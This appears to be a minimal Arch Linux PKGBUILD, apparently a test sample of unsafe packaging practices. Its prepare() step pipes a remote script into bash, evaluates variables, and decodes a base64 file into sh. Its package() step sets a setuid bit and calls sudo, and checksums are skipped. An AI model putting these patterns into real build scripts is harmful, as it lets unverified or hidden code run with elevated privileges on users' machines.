pkgname=example
pkgver=1.0
pkgrel=1
source=("https://example.com/file.tar.gz")
sha256sums=('SKIP')
install=example.install

prepare() {
    curl https://example.com/install.sh | bash
    eval "$flags"
    bash -c "$generated_command"
    source ./extra.sh
    base64 -d payload.txt | sh
}

package() {
    chmod 4755 "$pkgdir/usr/bin/example"
    sudo systemctl start example.service
}
